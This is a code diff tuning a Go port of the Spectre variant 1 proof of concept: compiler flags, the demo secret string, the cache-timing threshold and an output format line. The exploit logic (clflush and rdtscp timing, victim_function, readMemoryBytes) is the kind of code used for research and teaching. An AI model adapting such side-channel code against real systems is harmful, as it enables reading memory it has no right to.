@@ -3,7 +3,7 @@
 // https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
 package main
 
-// #cgo CFLAGS:-march=native
+// #cgo CFLAGS: -O0 -march=native
 // #include <x86intrin.h> /* for rdtscp and clflush */
 // static inline void __wrapper_mm_clflush( const void *__p) {
 //   _mm_clflush(__p);
@@ -22,7 +22,7 @@ var array1 = [160]uint8{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
 var unused2 = [64]uint8{}
 var array2 = [256 * 512]uint8{}
 
-var secret = []byte("Hello sadness my good old friend")
+var secret = []byte("The Magic Words are Squeamish Ossifrage.")
 var temp uint8 = 0
 
 func victim_function(x uint) {
@@ -35,7 +35,7 @@ func victim_function(x uint) {
 
 // ===================== Analysis code ===================
 
-const threshold = 280
+const threshold = 400
 
 func readMemoryBytes(malicious_x uint, value []uint8, score []int) {
 	results := [256]int{}
@@ -116,7 +116,7 @@ func main() {
 		} else {
 			fmt.Printf("Unclear: ")
 		}
-		fmt.Printf("0x%02X=’%s’ score=%d '", value[0], string(value[0]), score[0])
+		fmt.Printf("0x %02X=’%s’ score=%d '", value[0], string(value[0]), score[0])
 		if score[1] > 0 {
 			fmt.Printf("(second best: 0x%02X score=%d)", value[1], score[1])
 		}
